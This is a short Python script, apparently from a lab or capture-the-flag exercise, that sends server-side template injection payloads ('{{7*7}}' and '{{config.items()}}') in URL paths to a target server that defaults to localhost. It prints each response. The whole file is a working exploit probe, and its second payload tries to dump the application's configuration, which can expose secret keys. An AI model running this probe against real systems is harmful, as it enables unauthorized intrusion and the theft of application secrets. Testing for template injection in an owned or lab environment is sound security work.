#!/usr/bin/env python3
import os, requests
BASE = os.getenv('TARGET', 'http://127.0.0.1:5000')
for p in ['/{{7*7}}','/{{config.items()}}']:
    r = requests.get(BASE + p, timeout=10)
    print('\n[+] path', p)
    print(r.status_code)
    print(r.text[:1000])
